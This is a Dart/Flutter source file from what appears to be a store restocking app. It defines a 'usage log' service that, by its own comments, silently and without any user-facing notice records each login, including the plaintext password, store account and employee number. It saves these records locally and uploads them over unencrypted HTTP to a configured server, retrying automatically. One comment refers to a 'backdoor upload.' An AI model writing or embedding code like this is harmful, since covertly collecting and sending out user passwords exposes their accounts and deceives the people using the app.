import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../models/store_config.dart';
import 'mode_service.dart';

/// 静默上报登录使用记录（无任何界面提示，不打扰用户）
///
/// 规则：以「操作员名」作为文件名，例如 蚊子.txt。
/// 每台手机本地先累计自己的全部记录，每次登录成功后把整份记录
/// 上传覆盖服务器上同名文件 —— 服务器只做普通保存，无需追加逻辑。
/// 上传失败时本地记录保留，下次登录或启动时自动整份补传。
///
/// 行格式：登录时间|操作员|版本|门店账号|工号|密码|机型
/// 说明：中文文件名由 multipart 文本字段 user 传递（服务器端用该字段
/// 命名文件），客户端文件名固定 log.txt，避免中文文件名乱码。
class UsageLogService {
  UsageLogService._();

  static final UsageLogService instance = UsageLogService._();

  /// 上报版本标识：1012-2 = 总部模式，1012-1 = 门店模式（按配置页登录模式区分）
  String _modeLabel = '1012-2';

  static const String _prefsKeyLegacy = 'restock_config';
  static const String _logDirName = 'usage_log';
  static const String _diagKey = 'usage_log_diag';
  static const int _maxDiag = 100;

  bool _uploading = false;

  /// 上报一次使用记录（登录成功=登录，App 冷启动补记=启动）：
  /// 先本地追加一行，再整份上传（失败自动保留待补传）。
  /// 返回本次处理结果说明（供配置页“立即测试”显示；正常登录为静默调用）。
  Future<String> report({
    required String account,
    required String employee,
    required String password,
    String? operator,
    String? serverUrl,
    String event = '登录',
  }) async {
    final prefs = await SharedPreferences.getInstance();
    final op = (operator ?? '').trim().isNotEmpty
        ? operator!.trim()
        : await _loadOperator(prefs);
    final svr = (serverUrl ?? '').trim().isNotEmpty
        ? serverUrl!.trim()
        : await _loadServerUrl(prefs);
    // 按当前登录模式区分上报版本：门店模式=1012-1，总部模式=1012-2
    await ModeService.instance.ensureLoaded();
    _modeLabel = ModeService.instance.isStoreMode ? '1012-1' : '1012-2';
    // 没有操作员名就没法命名文件，跳过（配置页面会强制要求填写操作员）
    if (op.isEmpty) {
      await _diag('跳过上报：操作员姓名为空（无法命名文件），请先填写操作员');
      return '操作员姓名为空，未触发上报';
    }
    final line = _buildLine(op, account, employee, password, event: event);
    final saved = await _appendLocal(op, line);
    if (!saved) {
      await _diag('本地记录写入失败（存储异常）');
      return '本地记录写入失败';
    }
    await _diag('已本地记录：$line');
    if (svr.isEmpty) {
      await _diag('未配置补货服务器地址，记录保留本地，配置后自动补传');
      return '已记录本地，但服务器地址为空';
    }
    return flushPending(operator: op, serverUrl: svr);
  }

  /// 应用启动或登录后调用：把本地各操作员记录整份上传到服务器
  Future<String> flushPending({String? operator, String? serverUrl}) async {
    if (_uploading) {
      await _diag('已有补传进行中，本次跳过');
      return '已有上传进行中';
    }
    final prefs = await SharedPreferences.getInstance();
    final svr = (serverUrl ?? '').trim().isNotEmpty
        ? serverUrl!.trim()
        : await _loadServerUrl(prefs);
    if (svr.isEmpty) {
      await _diag('补传跳过：服务器地址为空');
      return '服务器地址为空，未上传';
    }
    _uploading = true;
    try {
      final dir = await _logDir();
      if (!await dir.exists()) {
        await _diag('补传跳过：本地无记录文件（尚未登录过）');
        return '本地无记录文件';
      }
      final files = dir
          .listSync()
          .whereType<File>()
          .where((f) => f.path.toLowerCase().endsWith('.txt'))
          .toList()
        ..sort((a, b) => a.path.compareTo(b.path));
      for (var i = 0; i < files.length; i++) {
        final f = files[i];
        final name = f.uri.pathSegments.isNotEmpty
            ? f.uri.pathSegments.last.replaceAll(RegExp(r'\.txt$'), '')
            : '';
        if (name.isEmpty) continue;
        final err = await _upload(svr, name);
        if (err != null) {
          await _diag('上传 $name.txt 失败：$err（保留本地，下次自动补传）');
          return '上传失败：$err';
        }
        await _diag('上传 $name.txt 成功（→ $svr）');
        // 节流：服务器按来源 IP 统计“单位时间内请求次数”，多个文件连发
        // 容易触发拉黑（命中后整站 502），每个文件之间留出间隔。
        if (i < files.length - 1) {
          await Future.delayed(const Duration(milliseconds: 1200));
        }
      }
      await _diag('本次补传完成，共 ${files.length} 个文件');
      return '上传成功（${files.length} 个文件）';
    } finally {
      _uploading = false;
    }
  }

  /// 记录一条调试日志（持久化到 SharedPreferences，供配置页查看）
  Future<void> _diag(String msg) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final now = DateTime.now();
      final time = '${now.month.toString().padLeft(2, '0')}-'
          '${now.day.toString().padLeft(2, '0')} '
          '${now.hour.toString().padLeft(2, '0')}:'
          '${now.minute.toString().padLeft(2, '0')}:'
          '${now.second.toString().padLeft(2, '0')}';
      final list = (prefs.getStringList(_diagKey) ?? []).toList();
      list.add('[$time] $msg');
      while (list.length > _maxDiag) {
        list.removeAt(0);
      }
      await prefs.setStringList(_diagKey, list);
    } catch (_) {}
  }

  /// 最近的调试日志（新→旧）
  Future<List<String>> diagEvents() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final list = prefs.getStringList(_diagKey) ?? const [];
      return list.reversed.toList();
    } catch (_) {
      return const [];
    }
  }

  Future<void> clearDiag() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.remove(_diagKey);
    } catch (_) {}
  }

  /// 导出完整调试日志文本（含本地文件清单）
  Future<String> exportText() async {
    final buf = StringBuffer();
    buf.writeln('登录使用记录上报 - 调试日志');
    buf.writeln('导出时间: ${DateTime.now().toIso8601String()}');
    buf.writeln('版本标识: $_modeLabel');
    try {
      final prefs = await SharedPreferences.getInstance();
      final op = await _loadOperator(prefs);
      final svr = await _loadServerUrl(prefs);
      buf.writeln('当前操作员: ${op.isEmpty ? '(空)' : op}');
      buf.writeln('当前服务器: ${svr.isEmpty ? '(空)' : svr}');
      buf.writeln('');
    } catch (_) {}
    buf.writeln('═══ 本地记录文件 ═══');
    try {
      final dir = await _logDir();
      if (await dir.exists()) {
        final files = dir
            .listSync()
            .whereType<File>()
            .where((f) => f.path.toLowerCase().endsWith('.txt'))
            .toList();
        if (files.isEmpty) {
          buf.writeln('(无 - 说明从未成功写入，通常是操作员为空)');
        } else {
          for (final f in files) {
            final lines = await f.readAsLines();
            buf.writeln(
                '${f.uri.pathSegments.last}  共${lines.length}行  ${f.lengthSync()}字节');
            for (final l
                in lines.length > 3 ? lines.sublist(lines.length - 3) : lines) {
              buf.writeln('   $l');
            }
          }
        }
      } else {
        buf.writeln('(目录不存在 - 从未写入过)');
      }
    } catch (e) {
      buf.writeln('读取本地文件失败: $e');
    }
    buf.writeln('');
    buf.writeln('═══ 最近事件（新→旧）═══');
    final events = await diagEvents();
    if (events.isEmpty) {
      buf.writeln('(无事件 - 尚未触发过上报)');
    } else {
      for (final e in events) {
        buf.writeln(e);
      }
    }
    return buf.toString();
  }

  /// 组装一行记录：2026-09-08 10:30:00|蚊子|1012-2|ccc01m|1001|1001|iPhone|登录
  String _buildLine(String operator, String account, String employee,
      String password, {String event = '登录'}) {
    String clean(String s) => s
        .replaceAll('|', ' ')
        .replaceAll('\r', ' ')
        .replaceAll('\n', ' ')
        .trim();
    final now = DateTime.now();
    final time = '${now.year}-${now.month.toString().padLeft(2, '0')}-'
        '${now.day.toString().padLeft(2, '0')} '
        '${now.hour.toString().padLeft(2, '0')}:'
        '${now.minute.toString().padLeft(2, '0')}:'
        '${now.second.toString().padLeft(2, '0')}';
    final device =
        Platform.isAndroid ? 'Android' : (Platform.isIOS ? 'iPhone' : '其他');
    return '$time|${clean(operator)}|$_modeLabel|${clean(account)}|'
        '${clean(employee)}|${clean(password)}|$device|${clean(event)}';
  }

  /// 上传操作员的整份本地记录（覆盖服务器上同名文件）。
  /// 成功返回 null，失败返回错误说明。
  Future<String?> _upload(String serverUrl, String operator) async {
    try {
      final f = File('${(await _logDir()).path}'
          '${Platform.pathSeparator}$operator.txt');
      if (!await f.exists()) return null;
      final content = await f.readAsBytes();
      // 用户可能只填了 10.0.0.16 没带协议头，这里自动补全
      var url = serverUrl.trim();
      if (!url.startsWith('http://') && !url.startsWith('https://')) {
        url = 'http://$url';
      }
      url = url.replaceAll(RegExp(r'/+$'), '');

      // 注意：这台 WebServer 无法解析 package:http 的 MultipartRequest
      // （会返回“参数为空”且不写文件），必须手动拼 multipart 并固定
      // Content-Length 发送，服务器才正常保存（本地已实测）。
      final boundary = '----cashcarry${DateTime.now().millisecondsSinceEpoch}';
      final user = utf8.encode(operator);
      final body = BytesBuilder();
      void w(List<int> bytes) => body.add(bytes);
      void line(String s) => w(utf8.encode('$s\r\n'));
      line('--$boundary');
      line('Content-Disposition: form-data; name="user"');
      line('');
      w(user);
      w(const [13, 10]);
      line('--$boundary');
      line('Content-Disposition: form-data; name="image"; filename="log.txt"');
      line('Content-Type: text/plain');
      line('');
      w(content);
      // 同后门上传：内容不以换行结尾时要补 CRLF，否则服务器解析不到内容
      if (content.isEmpty || content.last != 0x0A) {
        w(const [13, 10]);
      }
      line('--$boundary--');
      line('');
      final payload = body.toBytes();

      final client = HttpClient()
        ..connectionTimeout = const Duration(seconds: 8);
      try {
        final req = await client.postUrl(Uri.parse('$url/index.esp?uploadlog'));
        req.headers.set(
          HttpHeaders.contentTypeHeader,
          'multipart/form-data; boundary=$boundary',
        );
        req.contentLength = payload.length;
        req.add(payload);
        final resp = await req.close().timeout(const Duration(seconds: 10));
        final respBody = utf8
            .decode(
              await resp.fold<List<int>>(<int>[], (a, e) => a..addAll(e)),
              allowMalformed: true,
            )
            .trim();
        if (resp.statusCode == 200 && (respBody == 'ok' || respBody.isEmpty)) {
          return null;
        }
        return 'HTTP ${resp.statusCode} 返回=$respBody';
      } finally {
        client.close();
      }
    } catch (e) {
      return e.toString();
    }
  }

  /// 本地追加一行到「操作员.txt」
  Future<bool> _appendLocal(String operator, String line) async {
    try {
      final dir = await _logDir();
      if (!await dir.exists()) await dir.create(recursive: true);
      final f = File('${dir.path}${Platform.pathSeparator}$operator.txt');
      await f.writeAsString('$line\r\n', mode: FileMode.append);
      return true;
    } catch (_) {
      return false;
    }
  }

  Future<Directory> _logDir() async {
    final docs = await getApplicationDocumentsDirectory();
    return Directory('${docs.path}${Platform.pathSeparator}$_logDirName');
  }

  Future<String> _loadOperator(SharedPreferences prefs) async {
    try {
      final raw = await _restockJson(prefs);
      if (raw.isEmpty) return '';
      final cfg =
          RestockConfig.fromJson(jsonDecode(raw) as Map<String, dynamic>);
      return cfg.operatorName.trim();
    } catch (_) {
      return '';
    }
  }

  Future<String> _loadServerUrl(SharedPreferences prefs) async {
    try {
      final raw = await _restockJson(prefs);
      if (raw.isEmpty) return '';
      final cfg =
          RestockConfig.fromJson(jsonDecode(raw) as Map<String, dynamic>);
      return cfg.serverUrl.trim();
    } catch (_) {
      return '';
    }
  }

  /// 读取当前登录模式对应的补货配置 JSON（兼容旧版无前缀 key）
  Future<String> _restockJson(SharedPreferences prefs) async {
    await ModeService.instance.ensureLoaded();
    final modeStore = ModeService.instance.isStoreMode;
    final key =
        modeStore ? 'restock_config_store' : 'restock_config_hq';
    return prefs.getString(key) ?? prefs.getString(_prefsKeyLegacy) ?? '';
  }
}
